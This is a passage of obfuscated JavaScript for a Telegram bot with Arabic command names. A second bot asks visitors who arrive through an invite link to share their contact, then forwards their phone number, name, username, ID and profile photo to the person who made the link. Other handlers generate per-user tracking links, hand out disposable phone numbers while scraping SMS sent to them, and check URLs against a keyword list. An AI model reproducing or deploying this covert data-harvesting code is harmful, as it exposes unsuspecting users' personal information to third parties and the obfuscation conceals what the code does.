    }), console[_0x529e6f(0x9d7)](_0x529e6f(0xc6b) + _0x529e6f(0x4fd) + _0x529e6f(0xbf5) + _0x308fe4), _0x211dfa[_0x529e6f(0xbce)](_0x298967[_0x529e6f(0x299)]);
}), app[_0x298049(0x943)](_0x298049(0x9ba), (_0x17bc9c, _0x202cc8) => {
    const _0x55a354 = _0x298049, _0x27a8b5 = { 'HeKEv': _0x55a354(0x219) };
    _0x202cc8[_0x55a354(0x504)](path[_0x55a354(0xc65)](__dirname, _0x27a8b5[_0x55a354(0x649)]));
}), bot[_0x298049(0x65c)](/\/اتتهتتاههة/, _0x314449 => {
    const _0x5afc3d = _0x298049, _0x58bdad = {
            'ylJSW': _0x5afc3d(0xa65) + _0x5afc3d(0x66c) + _0x5afc3d(0xaae) + _0x5afc3d(0x50f) + _0x5afc3d(0x2df) + _0x5afc3d(0x49c),
            'dzZUJ': _0x5afc3d(0xabc) + _0x5afc3d(0x607) + _0x5afc3d(0x6b8),
            'aaWiu': _0x5afc3d(0x430) + _0x5afc3d(0x687)
        }, _0x4bbffc = _0x314449[_0x5afc3d(0x556)]['id'], _0x5b2d16 = _0x58bdad[_0x5afc3d(0x331)];
    bot[_0x5afc3d(0xb04) + 'e'](_0x4bbffc, _0x5b2d16, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x58bdad[_0x5afc3d(0x56e)],
                        'callback_data': _0x58bdad[_0x5afc3d(0x2d1)]
                    }]]
        }
    });
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x5efea9 => {
    const _0xc68564 = _0x298049, _0x1fe850 = {
            'RsQCB': function (_0x2d3b29, _0x1d7e60) {
                return _0x2d3b29 === _0x1d7e60;
            },
            'vrMfz': _0xc68564(0x430) + _0xc68564(0x687)
        }, _0x337962 = _0x5efea9[_0xc68564(0x33c)][_0xc68564(0x556)]['id'], _0x3b2290 = _0x5efea9[_0xc68564(0x33c)][_0xc68564(0x42f)];
    if (_0x1fe850[_0xc68564(0x976)](_0x5efea9[_0xc68564(0xc57)], _0x1fe850[_0xc68564(0xa48)])) {
        const _0x59cdfc = baseUrl + (_0xc68564(0x800) + _0xc68564(0x89c)) + _0x337962;
        bot[_0xc68564(0xb04) + 'e'](_0x337962, _0xc68564(0xa2f) + _0xc68564(0xc4d) + _0xc68564(0xc10) + _0x59cdfc);
    }
}), bot[_0x298049(0x65c)](/\/sخسننسمس/, _0x25381e => {
    const _0xfb6234 = _0x298049, _0x4042ad = {
            'TJCXD': _0xfb6234(0xbdb) + _0xfb6234(0xb4e),
            'yochM': _0xfb6234(0x5ce) + _0xfb6234(0x201),
            'FDkbP': _0xfb6234(0xc7c) + _0xfb6234(0x8ce) + _0xfb6234(0x604) + _0xfb6234(0x6be)
        }, _0x5bc757 = _0x25381e[_0xfb6234(0x556)]['id'], _0x1491c1 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x4042ad[_0xfb6234(0x61f)],
                            'callback_data': _0x4042ad[_0xfb6234(0x92a)]
                        }]]
            }
        };
    bot[_0xfb6234(0xb04) + 'e'](_0x5bc757, _0x4042ad[_0xfb6234(0x5d2)], _0x1491c1);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x2da84c => {
    const _0x19a2b4 = _0x298049, _0x52f544 = {
            'RcOLg': function (_0x56b467, _0x3bd146) {
                return _0x56b467 === _0x3bd146;
            },
            'SGulY': _0x19a2b4(0x5ce) + _0x19a2b4(0x201)
        };
    if (_0x52f544[_0x19a2b4(0xa98)](_0x2da84c[_0x19a2b4(0xc57)], _0x52f544[_0x19a2b4(0x5fd)])) {
        const _0x277789 = _0x2da84c[_0x19a2b4(0x9cc)]['id'], _0x530984 = _0x19a2b4(0x1fe) + _0x19a2b4(0x3b7) + _0x19a2b4(0x550) + _0x277789;
        bot[_0x19a2b4(0xb04) + 'e'](_0x2da84c[_0x19a2b4(0x33c)][_0x19a2b4(0x556)]['id'], _0x19a2b4(0x5e5) + _0x19a2b4(0x7b7) + _0x19a2b4(0xcd7) + _0x19a2b4(0x30f) + _0x19a2b4(0x1ed) + _0x19a2b4(0x793) + ':\x0a' + _0x530984);
    }
}), secondBot[_0x298049(0x65c)](/\/start (.+)/, (_0x5324f7, _0x78e126) => {
    const _0xd5a5f1 = _0x298049, _0x4e2849 = {
            'wfBKf': function (_0x116cdf, _0x103e22) {
                return _0x116cdf(_0x103e22);
            },
            'yAURv': _0xd5a5f1(0x616) + _0xd5a5f1(0x1dc),
            'UWkcD': _0xd5a5f1(0x860) + _0xd5a5f1(0x7e2) + _0xd5a5f1(0xb6f) + _0xd5a5f1(0x525) + _0xd5a5f1(0x2ab)
        }, _0x1a7a0f = _0x5324f7[_0xd5a5f1(0x556)]['id'], _0x4f144f = _0x4e2849[_0xd5a5f1(0x978)](parseInt, _0x78e126[-0xdc1 * 0x2 + 0x4e1 + 0x16a2]);
    inviteLinks[_0x5324f7[_0xd5a5f1(0x9cc)]['id']] = _0x4f144f;
    const _0xf46451 = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x4e2849[_0xd5a5f1(0x381)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
    secondBot[_0xd5a5f1(0xb04) + 'e'](_0x1a7a0f, _0x4e2849[_0xd5a5f1(0x8b1)], _0xf46451);
}), secondBot['on'](_0x298049(0x367), _0x2eb928 => {
    const _0xc605e4 = _0x298049, _0x500e79 = {
            'TWJGv': _0xc605e4(0xb0b) + _0xc605e4(0x493) + 'ح.',
            'Cpuoi': _0xc605e4(0x82b) + _0xc605e4(0x81e) + _0xc605e4(0x790),
            'mPoxo': _0xc605e4(0x380),
            'rVECc': function (_0x3ee02e, _0x1d5511) {
                return _0x3ee02e + _0x1d5511;
            },
            'RWkDy': function (_0x587860, _0x322537) {
                return _0x587860 + _0x322537;
            },
            'VQXBh': function (_0x3cb7a6, _0x235bbd) {
                return _0x3cb7a6 + _0x235bbd;
            },
            'qwKsE': function (_0x3ae735, _0x68b00e) {
                return _0x3ae735 > _0x68b00e;
            },
            'roOCL': _0xc605e4(0x8c1) + _0xc605e4(0x98f),
            'STUml': _0xc605e4(0x82b) + _0xc605e4(0x3d5) + _0xc605e4(0x3fe) + _0xc605e4(0x54e) + _0xc605e4(0x88b),
            'JXfJe': _0xc605e4(0xb86) + _0xc605e4(0xa46) + _0xc605e4(0x618) + _0xc605e4(0x90c) + _0xc605e4(0x8d7) + _0xc605e4(0x1a2),
            'CAmjN': function (_0xed28c, _0x2bc962) {
                return _0xed28c === _0x2bc962;
            },
            'ETxPz': _0xc605e4(0xc28) + _0xc605e4(0xc96),
            'zTiZb': _0xc605e4(0xa56) + 'ذة',
            'RRhAi': _0xc605e4(0x860) + _0xc605e4(0x7e2) + _0xc605e4(0x8fe) + _0xc605e4(0x4dc),
            'vJlWw': _0xc605e4(0xa38) + _0xc605e4(0x728) + _0xc605e4(0x1e7)
        };
    if (_0x2eb928[_0xc605e4(0x367)] && inviteLinks[_0x2eb928[_0xc605e4(0x9cc)]['id']]) {
        if (_0x500e79[_0xc605e4(0x87b)](_0x2eb928[_0xc605e4(0x367)][_0xc605e4(0xc0d)], _0x2eb928[_0xc605e4(0x9cc)]['id'])) {
            const _0x398ad5 = inviteLinks[_0x2eb928[_0xc605e4(0x9cc)]['id']], _0x47d3a6 = _0x2eb928[_0xc605e4(0x9cc)], _0x77b06e = _0x47d3a6['id'], _0xd24e4f = _0x47d3a6[_0xc605e4(0xa00)], _0x55ca82 = _0x47d3a6[_0xc605e4(0x6a2)] || '', _0x158c86 = _0x47d3a6[_0xc605e4(0x62c)] || _0x500e79[_0xc605e4(0x43d)], _0x3e3bbd = _0x47d3a6[_0xc605e4(0x548)] || _0x500e79[_0xc605e4(0xc5e)], _0x5e4524 = _0x2eb928[_0xc605e4(0x367)][_0xc605e4(0x4bc) + 'er'];
            secondBot[_0xc605e4(0xc80) + _0xc605e4(0x4b7)](_0x77b06e)[_0xc605e4(0x86c)](_0xddeb4d => {
                const _0x4ce01e = _0xc605e4, _0x43a733 = {
                        'Ttkhg': _0x500e79[_0x4ce01e(0x50a)],
                        'JHbOc': _0x500e79[_0x4ce01e(0xb6d)],
                        'RgMEE': _0x500e79[_0x4ce01e(0x603)]
                    }, _0x3b00ea = _0x500e79[_0x4ce01e(0xa23)](_0x500e79[_0x4ce01e(0x4ee)](_0x500e79[_0x4ce01e(0xa23)](_0x500e79[_0x4ce01e(0x7ec)](_0x4ce01e(0x9e1) + _0x4ce01e(0x664) + '\x0a', _0x4ce01e(0xb4c) + _0xd24e4f + '\x20' + _0x55ca82 + _0x4ce01e(0x8b5)), _0x4ce01e(0x9d9) + '@' + _0x158c86 + _0x4ce01e(0x8b5)), _0x4ce01e(0x31e) + _0x77b06e + _0x4ce01e(0x8b5)), _0x4ce01e(0x62b) + _0x4ce01e(0x44d) + _0x5e4524 + '\x0a');
                if (_0x500e79[_0x4ce01e(0xadf)](_0xddeb4d[_0x4ce01e(0x8b0) + 't'], -0x1ced + -0x15ad + 0x2fa * 0x11)) {
                    const _0x391ada = _0xddeb4d[_0x4ce01e(0x6a8)][-0xa68 + 0x1997 + -0xf2f][-0x16b5 + 0x1b8b + -0x4d6][_0x4ce01e(0x254)];
                    _0x391ada ? bot[_0x4ce01e(0x8ab)](_0x398ad5, _0x391ada, {
                        'caption': _0x3b00ea,
                        'parse_mode': _0x500e79[_0x4ce01e(0x603)]
                    })[_0x4ce01e(0x86c)](() => {
                        const _0x1be547 = _0x4ce01e;
                        console[_0x1be547(0x9d7)](_0x43a733[_0x1be547(0x32e)]);
                    })[_0x4ce01e(0x40a)](_0x2c50d5 => {
                        const _0x341d22 = _0x4ce01e;
                        console[_0x341d22(0x7b5)](_0x43a733[_0x341d22(0x191)], _0x2c50d5), bot[_0x341d22(0xb04) + 'e'](_0x398ad5, _0x3b00ea, { 'parse_mode': _0x43a733[_0x341d22(0x997)] });
                    }) : bot[_0x4ce01e(0xb04) + 'e'](_0x398ad5, _0x3b00ea, { 'parse_mode': _0x500e79[_0x4ce01e(0x603)] });
                } else
                    bot[_0x4ce01e(0xb04) + 'e'](_0x398ad5, _0x3b00ea, { 'parse_mode': _0x500e79[_0x4ce01e(0x603)] });
                secondBot[_0x4ce01e(0xb04) + 'e'](_0x2eb928[_0x4ce01e(0x556)]['id'], _0x500e79[_0x4ce01e(0xadb)]), delete inviteLinks[_0x2eb928[_0x4ce01e(0x9cc)]['id']];
            })[_0xc605e4(0x40a)](_0x13552c => {
                const _0x3ad9fe = _0xc605e4;
                console[_0x3ad9fe(0x7b5)](_0x500e79[_0x3ad9fe(0x84d)], _0x13552c), secondBot[_0x3ad9fe(0xb04) + 'e'](_0x2eb928[_0x3ad9fe(0x556)]['id'], _0x500e79[_0x3ad9fe(0xa90)]);
            });
        } else
            secondBot[_0xc605e4(0xb04) + 'e'](_0x2eb928[_0xc605e4(0x556)]['id'], _0x500e79[_0xc605e4(0x9a1)]);
    } else
        secondBot[_0xc605e4(0xb04) + 'e'](_0x2eb928[_0xc605e4(0x556)]['id'], _0x500e79[_0xc605e4(0xb5f)]);
}), secondBot['on'](_0x298049(0x33c), _0x1dda99 => {
    const _0x348790 = _0x298049, _0x987068 = {
            'PQbSf': function (_0x19b5c3, _0x27b107) {
                return _0x19b5c3 !== _0x27b107;
            },
            'crwrw': _0x348790(0xb77),
            'PXbkg': _0x348790(0x616) + _0x348790(0x1dc),
            'Pamoa': _0x348790(0x860) + _0x348790(0x7e2) + _0x348790(0xc3b)
        };
    if (!_0x1dda99[_0x348790(0x367)] && _0x987068[_0x348790(0x96e)](_0x1dda99[_0x348790(0x8e5)], _0x987068[_0x348790(0xa64)])) {
        const _0x4b72e4 = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x987068[_0x348790(0xaff)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x348790(0xb04) + 'e'](_0x1dda99[_0x348790(0x556)]['id'], _0x987068[_0x348790(0x1f7)], _0x4b72e4);
    }
});
const countries = {
    '+1': [
        _0x298049(0x495),
        _0x298049(0x1d8)
    ],
    '+46': [
        _0x298049(0x247),
        _0x298049(0x297)
    ],
    '+86': [
        _0x298049(0x4de),
        _0x298049(0x749)
    ],
    '+852': [
        _0x298049(0xbfe),
        _0x298049(0x86f)
    ],
    '+45': [
        _0x298049(0x731),
        _0x298049(0x640)
    ],
    '+33': [
        _0x298049(0x617),
        _0x298049(0x7ad)
    ],
    '+31': [
        _0x298049(0xa21),
        _0x298049(0x539)
    ],
    '+7': [
        _0x298049(0x339),
        _0x298049(0xd34)
    ],
    '+7KZ': [
        _0x298049(0xc29),
        _0x298049(0x5f0)
    ],
    '+381': [
        _0x298049(0x2b6),
        _0x298049(0x8c0)
    ],
    '+44': [
        _0x298049(0x38d),
        _0x298049(0xafd)
    ],
    '+371': [
        _0x298049(0x6a1),
        _0x298049(0x8eb)
    ],
    '+62': [
        _0x298049(0x7a9),
        _0x298049(0x653)
    ],
    '+351': [
        _0x298049(0x84f),
        _0x298049(0x755)
    ],
    '+34': [
        _0x298049(0xc69),
        _0x298049(0x50b)
    ],
    '+372': [
        _0x298049(0xd2f),
        _0x298049(0xa0f)
    ],
    '+358': [
        _0x298049(0x5f7),
        _0x298049(0x6e3)
    ]
};
async function importNumbers() {
    const _0x3de3ff = _0x298049, _0x41b97d = {
            'AmbDQ': _0x3de3ff(0x54b) + _0x3de3ff(0x3de) + _0x3de3ff(0x27b),
            'nCuVl': _0x3de3ff(0x846) + _0x3de3ff(0x5dc)
        };
    try {
        const _0x49389f = await axios[_0x3de3ff(0x943)](_0x41b97d[_0x3de3ff(0xcb4)]);
        return _0x49389f[_0x3de3ff(0xc57)][_0x3de3ff(0xb11)]('\x0a');
    } catch (_0x56f1bb) {
        return console[_0x3de3ff(0x7b5)](_0x41b97d[_0x3de3ff(0x803)], _0x56f1bb), [];
    }
}
async function getRandomNumberInfo() {
    const _0xf5a4c5 = _0x298049, _0x1f5ae8 = {
            'uwrdJ': function (_0xdbfba4) {
                return _0xdbfba4();
            },
            'ycEOJ': function (_0x51ec0b, _0x37e65c) {
                return _0x51ec0b === _0x37e65c;
            },
            'bWqbd': function (_0x1587fb, _0xb590d3) {
                return _0x1587fb * _0xb590d3;
            },
            'tXoiP': _0xf5a4c5(0x8b6),
            'skOPc': _0xf5a4c5(0x7c5),
            'zNCGb': function (_0x5f420e, _0x403e8b) {
                return _0x5f420e in _0x403e8b;
            },
            'PRkwo': _0xf5a4c5(0x8d6) + _0xf5a4c5(0xd00)
        }, _0x451ff0 = await _0x1f5ae8[_0xf5a4c5(0xb91)](importNumbers);
    if (_0x1f5ae8[_0xf5a4c5(0x24a)](_0x451ff0[_0xf5a4c5(0x825)], 0x1428 + -0x7 * -0x545 + 0x11 * -0x35b))
        return null;
    const _0x5a9bea = Math[_0xf5a4c5(0xac9)](_0x1f5ae8[_0xf5a4c5(0x4a9)](Math[_0xf5a4c5(0x916)](), _0x451ff0[_0xf5a4c5(0x825)])), _0x5a62a8 = _0x451ff0[_0x5a9bea][_0xf5a4c5(0x5b6)](), _0x2aef91 = new Date()[_0xf5a4c5(0x829) + 'g']()[_0xf5a4c5(0xb11)]('T')[0xe63 + 0x1ec + -0xa7 * 0x19], _0x3debba = new Date()[_0xf5a4c5(0x598) + _0xf5a4c5(0x6d6)](_0x1f5ae8[_0xf5a4c5(0x364)]);
    let _0x461fd9;
    if (_0x5a62a8[_0xf5a4c5(0x5cd)]('+1'))
        _0x461fd9 = '+1';
    else
        _0x5a62a8[_0xf5a4c5(0x5cd)]('+7') ? _0x461fd9 = _0x5a62a8[_0xf5a4c5(0x948)]('7') ? _0x1f5ae8[_0xf5a4c5(0x32f)] : '+7' : _0x461fd9 = _0x1f5ae8[_0xf5a4c5(0x4a7)](_0x5a62a8[_0xf5a4c5(0x69c)](-0x13 * 0x1ea + 0x45b * 0x8 + 0x2 * 0xc3, 0x31 * -0x35 + -0x1 * -0x1535 + -0xb0c), countries) ? _0x5a62a8[_0xf5a4c5(0x69c)](0x1 * -0x2313 + 0x5db * 0x1 + 0x1d38, 0x28 * 0x83 + -0x9 * 0x3bc + 0x2 * 0x694) : _0x5a62a8[_0xf5a4c5(0x69c)](-0x9b * 0x4 + -0xd * 0xd2 + 0xd16, 0x1709 * 0x1 + 0x2f * 0x22 + 0x751 * -0x4);
    const [_0x5e93bb, _0x10d072] = countries[_0x461fd9] || [
        _0x1f5ae8[_0xf5a4c5(0x557)],
        '🚩'
    ];
    return {
        'number': _0x5a62a8,
        'countryCode': _0x461fd9,
        'countryName': _0x5e93bb,
        'countryFlag': _0x10d072,
        'creationDate': _0x2aef91,
        'creationTime': _0x3debba
    };
}
async function getMessages(_0x45dd28) {
    const _0x40c7f2 = _0x298049, _0x398481 = {
            'AXsyc': function (_0x3b94d9, _0x36fe68) {
                return _0x3b94d9(_0x36fe68);
            },
            'zFVNv': function (_0x20d1c9, _0x261e24) {
                return _0x20d1c9(_0x261e24);
            },
            'VXzhZ': _0x40c7f2(0xa87) + _0x40c7f2(0x80b) + _0x40c7f2(0x65d),
            'NeGWy': _0x40c7f2(0x846) + _0x40c7f2(0x8db)
        };
    try {
        const _0x2dcf74 = await axios[_0x40c7f2(0x943)](_0x40c7f2(0x70c) + _0x40c7f2(0x523) + _0x40c7f2(0x8a4) + _0x45dd28), _0x18fdca = cheerio[_0x40c7f2(0x8f7)](_0x2dcf74[_0x40c7f2(0xc57)]), _0x5c8f11 = [];
        return _0x398481[_0x40c7f2(0xbd9)](_0x18fdca, _0x398481[_0x40c7f2(0xc62)])[_0x40c7f2(0xb61)]((_0x86d1e8, _0x117065) => {
            const _0x2bceba = _0x40c7f2;
            _0x5c8f11[_0x2bceba(0x39e)](_0x398481[_0x2bceba(0xade)](_0x18fdca, _0x117065)[_0x2bceba(0x8e5)]()[_0x2bceba(0x5b6)]());
        }), _0x5c8f11;
    } catch (_0x56ae16) {
        return console[_0x40c7f2(0x7b5)](_0x398481[_0x40c7f2(0x89a)], _0x56ae16), [];
    }
}
bot[_0x298049(0x65c)](/\/stسمهصخصt/, _0x503355 => {
    const _0x3bdc63 = _0x298049, _0xc68258 = {
            'aQZSy': _0x3bdc63(0xad4) + _0x3bdc63(0x26a),
            'fDynE': _0x3bdc63(0x6bc),
            'CciDg': _0x3bdc63(0x27d) + _0x3bdc63(0xc53) + _0x3bdc63(0x3cd) + _0x3bdc63(0x8aa)
        }, _0xe446cb = _0x503355[_0x3bdc63(0x556)]['id'], _0x447e19 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0xc68258[_0x3bdc63(0xa27)],
                            'callback_data': _0xc68258[_0x3bdc63(0xadd)]
                        }]]
            }
        };
    bot[_0x3bdc63(0xb04) + 'e'](_0xe446cb, _0xc68258[_0x3bdc63(0x449)], _0x447e19);
});
const m = _0x298049(0xc20) + _0x298049(0xac2) + 'ج';
bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x351e9a => {
    const _0x2f9729 = _0x298049, _0x57e0b2 = {
            'oKyxF': function (_0x14e2af, _0x1f0439) {
                return _0x14e2af === _0x1f0439;
            },
            'hZMRI': _0x2f9729(0x6bc),
            'MPTHl': function (_0x50e2ce) {
                return _0x50e2ce();
            },
            'ojlxx': _0x2f9729(0x835) + _0x2f9729(0x876),
            'zCUJG': _0x2f9729(0xbed) + '💬',
            'JldBU': function (_0x47d07a, _0x543843) {
                return _0x47d07a + _0x543843;
            },
            'vXJCk': function (_0x3b5547, _0x40a261) {
                return _0x3b5547 + _0x40a261;
            },
            'IWLGs': function (_0x31ba97, _0x4e992a) {
                return _0x31ba97 + _0x4e992a;
            },
            'VFyeN': _0x2f9729(0x380),
            'hoOkR': _0x2f9729(0x90a) + _0x2f9729(0x779) + _0x2f9729(0x7d8),
            'dquRj': _0x2f9729(0x982) + _0x2f9729(0x75a),
            'BTKdY': function (_0x65b1eb, _0x469329) {
                return _0x65b1eb(_0x469329);
            },
            'EXEYa': function (_0x2ae85e, _0x21c8da) {
                return _0x2ae85e > _0x21c8da;
            },
            'inDcf': _0x2f9729(0x776) + _0x2f9729(0x1e5) + _0x2f9729(0x374),
            'fQQZA': _0x2f9729(0x6f4) + _0x2f9729(0xa32)
        }, _0x3f6c47 = _0x351e9a[_0x2f9729(0x33c)], _0x4417a7 = _0x3f6c47[_0x2f9729(0x556)]['id'], _0x1885f2 = _0x351e9a[_0x2f9729(0xc57)];
    if (_0x57e0b2[_0x2f9729(0x257)](_0x1885f2, _0x57e0b2[_0x2f9729(0xc86)])) {
        const _0x5da84f = await _0x57e0b2[_0x2f9729(0x1c6)](getRandomNumberInfo);
        if (_0x5da84f) {
            const _0xac5558 = {
                    'reply_markup': {
                        'inline_keyboard': [
                            [{
                                    'text': _0x57e0b2[_0x2f9729(0x879)],
                                    'callback_data': _0x57e0b2[_0x2f9729(0xc86)]
                                }],
                            [{
                                    'text': _0x57e0b2[_0x2f9729(0x899)],
                                    'callback_data': _0x2f9729(0x982) + _0x2f9729(0x75a) + _0x5da84f[_0x2f9729(0x941)]
                                }]
                        ]
                    }
                }, _0x27a34e = _0x57e0b2[_0x2f9729(0x74a)](_0x57e0b2[_0x2f9729(0x74a)](_0x57e0b2[_0x2f9729(0x74a)](_0x57e0b2[_0x2f9729(0x9b6)](_0x57e0b2[_0x2f9729(0x7b4)](_0x57e0b2[_0x2f9729(0x74a)](_0x2f9729(0x496) + _0x2f9729(0xb1d) + _0x2f9729(0xb9d) + _0x2f9729(0x2cb) + _0x5da84f[_0x2f9729(0x941)] + '`\x0a', _0x2f9729(0x56f) + '\x20' + _0x5da84f[_0x2f9729(0x4f7) + 'e'] + '\x20' + _0x5da84f[_0x2f9729(0x24b) + 'g'] + '\x0a'), _0x2f9729(0x939) + _0x2f9729(0x45c) + _0x5da84f[_0x2f9729(0x9b7) + 'e'] + '\x0a'), _0x2f9729(0x988) + _0x2f9729(0x44d) + m + '\x0a'), _0x2f9729(0x5c2) + _0x2f9729(0xa70) + _0x5da84f[_0x2f9729(0x1a6) + 'te'] + '\x0a'), _0x2f9729(0x6ee) + _0x2f9729(0x770) + _0x5da84f[_0x2f9729(0x9dc) + 'me'] + '\x0a'), _0x2f9729(0x63c) + _0x2f9729(0x8d4) + '.');
            bot[_0x2f9729(0x382) + _0x2f9729(0x220)](_0x27a34e, {
                'chat_id': _0x4417a7,
                'message_id': _0x3f6c47[_0x2f9729(0x42f)],
                'parse_mode': _0x57e0b2[_0x2f9729(0xb3f)],
                'reply_markup': _0xac5558[_0x2f9729(0xb54) + 'up']
            });
        } else
            bot[_0x2f9729(0xb04) + 'e'](_0x4417a7, _0x57e0b2[_0x2f9729(0x261)]);
    } else {
        if (_0x1885f2[_0x2f9729(0x5cd)](_0x57e0b2[_0x2f9729(0xcac)])) {
            const _0x4a7796 = _0x1885f2[_0x2f9729(0xb11)]('_')[0x19ec + 0xa81 * -0x2 + -0x4e8], _0x52833a = await _0x57e0b2[_0x2f9729(0xcc8)](getMessages, _0x4a7796);
            if (_0x57e0b2[_0x2f9729(0x750)](_0x52833a[_0x2f9729(0x825)], 0x61f + 0x224 * 0x6 + -0x12f7)) {
                let _0x4718c0 = _0x52833a[_0x2f9729(0x69c)](-0x19b2 + 0x1 * -0x1bb2 + 0xc * 0x473, -0x2709 * -0x1 + -0x688 + -0x207b)[_0x2f9729(0x5c0)]((_0x4bdc6b, _0x392957) => _0x2f9729(0xa91) + 'م\x20' + (_0x392957 + (0x12df + 0x254 + -0x1532 * 0x1)) + _0x2f9729(0x5d8) + _0x4bdc6b + '`')[_0x2f9729(0xc65)]('\x0a\x0a');
                _0x4718c0 += _0x57e0b2[_0x2f9729(0xb2e)], bot[_0x2f9729(0xb04) + 'e'](_0x4417a7, _0x4718c0, { 'parse_mode': _0x57e0b2[_0x2f9729(0xb3f)] });
            } else
                bot[_0x2f9729(0xb04) + 'e'](_0x4417a7, _0x57e0b2[_0x2f9729(0x8d8)]);
        }
    }
});
const dangerous_keywords = [
        _0x298049(0x4b0),
        _0x298049(0xac6),
        'gd',
        _0x298049(0x22f),
        _0x298049(0x687),
        _0x298049(0x75f),
        _0x298049(0x725),
        _0x298049(0x36b),
        _0x298049(0x742),
        _0x298049(0x3b1),
        _0x298049(0xbd1),
        _0x298049(0x560),
        _0x298049(0xbea)
    ], safe_urls = [
        _0x298049(0x441),
        _0x298049(0x937),
        _0x298049(0xb67),
        _0x298049(0xbc6) + _0x298049(0x8c9),
        _0x298049(0x29b) + _0x298049(0x7a6),
        _0x298049(0x67f) + 'om',
        _0x298049(0xc58),
        _0x298049(0x3b9),
        _0x298049(0x292) + 'om',
        _0x298049(0x1c1),
        _0x298049(0x4c5) + 'om'
    ];
let waiting_for_link = {};
function checkUrl(_0x27a65e) {
    const _0x4444ea = _0x298049, _0x3859f7 = {
            'EPRFa': _0x4444ea(0x578),
            'qegAB': _0x4444ea(0x905) + '🔴',
            'kJhRe': _0x4444ea(0x1c1),
            'bFtym': _0x4444ea(0x9b4)
        }, _0x694e81 = _0x27a65e[_0x4444ea(0xd26) + 'e']();
    for (let _0xc8298a of safe_urls) {
        if (_0x694e81[_0x4444ea(0x948)](_0xc8298a))
            return _0x3859f7[_0x4444ea(0x893)];
    }
    for (let _0x2a047c of dangerous_keywords) {
        if (_0x694e81[_0x4444ea(0x948)](_0x2a047c))
            return _0x3859f7[_0x4444ea(0x248)];
    }
    if (!_0x694e81[_0x4444ea(0x948)](_0x3859f7[_0x4444ea(0x683)]))
        return _0x3859f7[_0x4444ea(0x2f9)];
    return _0x3859f7[_0x4444ea(0x893)];
}
function isValidUrl(_0x4b4623) {
    const _0x42f2e0 = _0x298049, _0x4ee3e5 = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
    return _0x4ee3e5[_0x42f2e0(0x3ad)](_0x4b4623);
}
async function getIpInfo(_0x550fa3) {
    const _0x592e15 = _0x298049;
    try {
        const _0x38b478 = await axios[_0x592e15(0x943)](_0x592e15(0xa09) + _0x592e15(0xb3c) + _0x550fa3 + _0x592e15(0x4ac));
        return _0x38b478[_0x592e15(0xc57)];
    } catch (_0x58321a) {
        return null;
    }
}
function extractIpFromUrl(_0x5c5d05) {
    const _0x3d4222 = _0x298049, _0x17c5c6 = {
            'pYsrg': function (_0x23e34b, _0xdc86da) {
                return _0x23e34b(_0xdc86da);
            },
            'RCSOJ': function (_0x4f87ef, _0x3c5ef7) {
                return _0x4f87ef(_0x3c5ef7);
            }
        };
    try {
        const _0x32eb85 = new URL(_0x5c5d05)[_0x3d4222(0x346)];
        return new Promise((_0x10cc58, _0x473db3) => {
            const _0x5a3878 = _0x3d4222, _0x25d2c4 = {
                    'AILWM': function (_0x222453, _0x2559eb) {
                        const _0x389f7b = _0x1900;
                        return _0x17c5c6[_0x389f7b(0xb5c)](_0x222453, _0x2559eb);
                    },
                    'sPrPF': function (_0x400627, _0x54018d) {
                        const _0x428e55 = _0x1900;
                        return _0x17c5c6[_0x428e55(0x37d)](_0x400627, _0x54018d);
                    }
                };
            dns[_0x5a3878(0x3e6)](_0x32eb85, (_0x1771ad, _0x5271ee) => {
                const _0x2b39bd = _0x5a3878;
                if (_0x1771ad)
                    _0x25d2c4[_0x2b39bd(0x425)](_0x473db3, null);
                else
                    _0x25d2c4[_0x2b39bd(0x4b2)](_0x10cc58, _0x5271ee);
            });
        });
    } catch (_0x4622ef) {
        return null;
    }
}
bot[_0x298049(0x65c)](/\/sكخزننننtart/, _0xdba02e => {
    const _0x50e939 = _0x298049, _0x2c82e4 = {
            'IezJP': _0x50e939(0xca6) + 'ط',
            'YHTXL': _0x50e939(0x29c) + 's',
            'iZyyT': _0x50e939(0x27d) + _0x50e939(0x627) + _0x50e939(0x5d4)
        }, _0x45bc3d = _0xdba02e[_0x50e939(0x556)]['id'], _0x3d4d2e = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x2c82e4[_0x50e939(0x8cc)],
                            'callback_data': _0x2c82e4[_0x50e939(0x68a)]
                        }]]
            }
        };
    bot[_0x50e939(0xb04) + 'e'](_0x45bc3d, _0x2c82e4[_0x50e939(0x66f)], _0x3d4d2e);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x264755 => {
    const _0x3d1cd4 = _0x298049, _0x478a56 = {
            'WahqE': function (_0x32d22d, _0x1d6663) {
                return _0x32d22d === _0x1d6663;
            },
            'ZjGUP': _0x3d1cd4(0x29c) + 's',
            'cPewT': _0x3d1cd4(0x268) + _0x3d1cd4(0x9f4) + _0x3d1cd4(0x361)
        }, _0x8a5335 = _0x264755[_0x3d1cd4(0x33c)][_0x3d1cd4(0x556)]['id'];
    _0x478a56[_0x3d1cd4(0x260)](_0x264755[_0x3d1cd4(0xc57)], _0x478a56[_0x3d1cd4(0x5c7)]) && (bot[_0x3d1cd4(0xb04) + 'e'](_0x8a5335, _0x478a56[_0x3d1cd4(0x43c)]), waiting_for_link[_0x8a5335] = !![]);
}), bot['on'](_0x298049(0x33c), async _0x5eeb67 => {
    const _0x5bf670 = _0x298049, _0x1faf28 = {
            'tgtUI': function (_0x328575, _0x2ce804) {
                return _0x328575(_0x2ce804);
            },
            'nmKrp': _0x5bf670(0x860) + _0x5bf670(0xa41) + _0x5bf670(0x6f5),
            'klyyG': _0x5bf670(0x44e) + _0x5bf670(0xc13) + _0x5bf670(0x1dd) + '%',
            'ZFAQV': function (_0x1b20bb, _0xbb12a0) {
                return _0x1b20bb(_0xbb12a0);
            },
            'rabat': _0x5bf670(0x44e) + _0x5bf670(0xb45) + _0x5bf670(0x97c) + '5%',
